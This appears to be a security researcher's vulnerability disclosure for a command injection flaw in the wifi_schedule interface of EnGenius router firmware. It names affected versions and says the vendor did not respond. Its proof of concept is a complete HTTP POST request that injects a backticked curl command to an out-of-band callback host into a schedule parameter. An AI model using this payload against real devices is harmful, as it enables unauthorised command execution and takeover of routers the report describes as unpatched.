=== Content from k9u7kv33ub.feishu.cn_a610a70f_20250115_102746.html ===
         ShareCommand Injection In wifi\_schedule interface Of ENGENIUS Router   Type '/' for commands
# Command Injection In wifi\_schedule interface Of ENGENIUS Router ​

![](https://s3-imfile.feishucdn.com/static-resource/v1/e6f5a9e2-91f0-4b42-9c06-c702a7925879~?image_size=72x72&cut_type=default-face&quality=&format=jpeg&sticker_format=.webp)Feishu user 1258Modified November 18, 2024BUG\_Author: i3eg1nner​Vendor: [engenius]([https://www.engeniustech.com](https://www.engeniustech.com/wp_firmware/))​Firmware: [Firmware download page](<https://www.engeniustech.com/wp_firmware/>)​Affected Version:​The latest version firmware of all routing devices and all previous versions, specific version information is as follows.​ENH1350EXT-3.5​ENS500-AC-v3.7.20​ens620ext-all-v3.9.1.7​Description:​There is a command injection vulnerability in the Engenius routing device /admin/network/wifi\_schedule interface. After the user logs in to the device, command injection is performed on parameters such as wifi\_schedule\_day\_em\_5, and the system can successfully execute commands, which can directly obtain system permissions. This affects all versions, including the latest firmware version.​Proof of Concept:​After the firmware is decrypted, it needs to reverse compile the lua bytecode and then analyze it. The core code of the vulnerability in the lua file is shown in the following figure​![common.docs_name - LarkCCM_Docs_Menu_Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/v2/cover/Kg9MbF9D5ovRB8x3I0tcREgAnnd/?fallback_source=1&height=1280&mount_node_token=V3ZIdp3UMo03Cvx1oymciJXSnVd&mount_point=docx_image&policy=equal&width=1280)When the WiFi timing task is not enabled, the enabled data packet contains parameters such as user input wifi\_schedule\_day\_em\_5, which are not filtered and are directly used as parameters of exec, resulting in command execution. Triggering the sendmail service can cause the command command to be executed​BashPOST /cgi-bin/luci/;stok=f6d4cf653d34c126e4f9282b6de26f4e/admin/network/wifi\_schedule HTTP/1.1​Host: ip​Cookie: sysauth=f82a9195bc56c1c8ba5da9517d132b4b; sysauth=​Content-Length: 1043​Cache-Control: max-age=0​Sec-Ch-Ua: "Google Chrome";v="112", "Chromium";v="112", "Not=A?Brand";v="24"​Sec-Ch-Ua-Mobile: ?1​Sec-Ch-Ua-Platform: "Android"​Upgrade-Insecure-Requests: 1​Origin: https://24.72.162.71​Content-Type: application/x-www-form-urlencoded​User-Agent: Mozilla/5.0 (Linux; Android 13; SM-A037U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 uacq​Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7​Sec-Fetch-Site: same-origin​Sec-Fetch-Mode: navigate​Sec-Fetch-User: ?1​Sec-Fetch-Dest: document​Accept-Encoding: gzip, deflate, br​Accept-Language: en-GB,en;q=0.9,en-US;q=0.8​Priority: u=0, i​Connection: close​ ​power\_en=0&schedule\_en=1&wifi\_schedule\_iface=ath1&wifi\_schedule\_templates=4&wifi\_schedule\_day\_sw\_0=1&wifi\_schedule\_day\_sh\_0=00&wifi\_schedule\_day\_sm\_0=00&wifi\_schedule\_day\_eh\_0=24&wifi\_schedule\_day\_em\_0=00&wifi\_schedule\_day\_sw\_1=1&wifi\_schedule\_day\_sh\_1=00&wifi\_schedule\_day\_sm\_1=00&wifi\_schedule\_day\_eh\_1=24&wifi\_schedule\_day\_em\_1=00&wifi\_schedule\_day\_sw\_2=1&wifi\_schedule\_day\_sh\_2=00&wifi\_schedule\_day\_sm\_2=00&wifi\_schedule\_day\_eh\_2=24&wifi\_schedule\_day\_em\_2=00&wifi\_schedule\_day\_sw\_3=1&wifi\_schedule\_day\_sh\_3=00&wifi\_schedule\_day\_sm\_3=00&wifi\_schedule\_day\_eh\_3=24&wifi\_schedule\_day\_em\_3=00&wifi\_schedule\_day\_sw\_4=1&wifi\_schedule\_day\_sh\_4=00&wifi\_schedule\_day\_sm\_4=00&wifi\_schedule\_day\_eh\_4=24&wifi\_schedule\_day\_em\_4=00&wifi\_schedule\_day\_sw\_5=`curl%20ucakgyhy5e8p227ujhe6lpsu2l8cwakz.oastify.com`&wifi\_schedule\_day\_sh\_5=00&wifi\_schedule\_day\_sm\_5=00&wifi\_schedule\_day\_eh\_5=24&wifi\_schedule\_day\_em\_5=00&wifi\_schedule\_day\_sw\_6=1&wifi\_schedule\_day\_sh\_6=00&wifi\_schedule\_day\_sm\_6=00&wifi\_schedule\_day\_eh\_6=24&wifi\_schedule\_day\_em\_6=00&submitType=0​![common.docs_name - LarkCCM_Docs_Menu_Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/v2/cover/LN89bZvIRoYlzVx4mMTcmJf6nmf/?fallback_source=1&height=1280&mount_node_token=BrWcdjoFDoC980x1qTdc6LlunTc&mount_point=docx_image&policy=equal&width=1280)We tried to contact the ENGENIUS manufacturer, but there was no response.​
